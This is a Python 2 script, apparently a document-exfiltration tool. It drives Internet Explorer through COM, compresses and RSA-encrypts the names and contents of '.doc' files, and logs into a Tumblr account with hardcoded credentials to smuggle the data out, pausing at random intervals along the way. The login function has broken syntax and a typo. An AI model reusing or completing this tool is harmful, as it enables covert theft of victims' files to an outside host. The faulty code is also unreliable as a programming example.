import win32com.client
import os
import fnmatch
import time
import random
import zlib

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

doc_type = ".doc"
username = "jms@bughunter.ca"
password = "justinBHP2014"

public_key = ""


def wait_for_browser(browser):
    # wait for the browser to finish the loading page
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)

    return


def encrypt_string(plaintext):
    chunk_size = 256
    print "Compressing: %d bytes" % len(plaintext)
    plaintext = zlib.compress(plaintext)

    print "Encrypting %d bytes" % len(plaintext)

    rsakey = RSA.importKey(public_key)
    rsakey = PKCS1_OAEP.new(rsakey)

    encrypted = ""
    offset = 0

    while offset < len(plaintext):
        chunk = plaintext[offset:offset+chunk_size]

        if len(chunk) % chunk_size != 0:
            chunk += " " * (chunk_size - len(chunk))

        encrypted += rsakey.encrypt(chunk)
        offset += chunk_size

    encrypted = encrypted.encode("base64")

    print("Base64 encoded crypto: %d" % len(encrypted))

    return encrypted


def encrypt_post(filename):
    # open and read the file
    fd = open(filename, "rb")
    contents = fd.read()
    fd.close()

    encrypted_title = encrypt_string(filename)
    encrypted_body = encrypt_string(contents)

    return encrypted_title, encrypted_body


def random_sleep():
    time.sleep(random.randint(5, 10))
    return


def login_to_tumbler(ie):
    # retreive all elements in the document
    full_doc = ie.Document.all

    # iterate looking for the login form
    for i in full_doc:
        if i.id == "signup_email":
            i.setAttribute("vaue", username)
        elif i.id == "signup_password":
            i.setAttribute("value", password)

    random_sleep()

    # you can be presented with different home pages
    if ie.Document.forms[0].id == "signup_form":
        ie.Document.forms[0].submit()
    else:
        ie.Document.forms[1].submit()
    except IndexError, e:
        pass

    random_sleep()

    # the login form is in the second form on the page
    wait_for_browser(ie)

    return
